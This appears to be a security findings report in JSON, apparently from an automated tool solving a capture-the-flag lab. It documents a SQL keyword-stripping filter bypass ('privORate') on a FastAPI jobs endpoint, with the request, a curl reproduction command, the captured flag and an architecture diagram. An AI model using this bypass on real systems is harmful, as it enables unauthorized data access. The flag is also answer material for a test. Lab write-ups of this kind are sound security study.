@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T20:59:13.557414+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "8ffb7f7d-f77c-43d7-be88-d4db11b38522",
+      "timestamp": "2026-04-12T20:59:13.557316+00:00",
+      "title": "SQLi Filter Bypass via Keyword Stripping - Private Job Access + CTF Flag",
+      "severity": "critical",
+      "target": "http://172.17.0.1:57297/jobs",
+      "description": "The POST /jobs endpoint takes a job_type parameter and concatenates it unsanitized into a SQL query. A server-side filter strips known SQL keywords (OR, UNION, SELECT, etc.) and blocks the value 'private' with a 403. However, by embedding a banned keyword INSIDE the word 'private', the filter removes it and reconstructs the intended value - e.g. 'privORate' strips 'OR' to yield 'private', which the 403 check never sees because the check fires AFTER keyword stripping. This allows unauthenticated access to private jobs containing the CTF flag.",
+      "evidence": "POST /jobs HTTP/1.1\nContent-Type: application/json\n\n{\"job_type\": \"privORate\"}\n\nResponse 200 OK:\n[{\"id\":3,\"name\":\"Hidden job\",\"type\":\"private\",\"description\":\"flag{582d82bb-2c1f-4ba5-9357-e8b94217957f}\"}]\n\nFLAG: flag{582d82bb-2c1f-4ba5-9357-e8b94217957f}",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -s -X POST http://172.17.0.1:57297/jobs -H 'Content-Type: application/json' -d '{\"job_type\":\"privORate\"}'",
+        "expected": "Returns private job with flag{582d82bb-2c1f-4ba5-9357-e8b94217957f}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "6daab4f2-eb70-4611-9278-e279ee3ab71b",
+      "timestamp": "2026-04-12T20:59:25.602120+00:00",
+      "title": "Ultimate Job Aggregator - Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser (Bootstrap 4.5.2)\"] -->|\"POST /jobs {job_type}\"| API[\"FastAPI /jobs Endpoint\"]\n  API -->|\"Strip banned keywords OR, UNION, SELECT\"| Filter[\"Keyword Strip Filter\"]\n  Filter -->|\"if input == 'private' -> 403\"| PrivateCheck[\"Admin Check\"]\n  Filter -->|\"Filtered input in SQL\"| DB[\"SQLite DB (jobs table)\"]\n  DB -->|\"id, name, type, description\"| API\n  PrivateCheck -->|\"bypass: privORate -> private\"| DB\n  DB -->|\"flag in private job description\"| Flag[\"flag{582d82bb-2c1f-4ba5-9357-e8b94217957f}\"]"
+    }
+  ]
+}
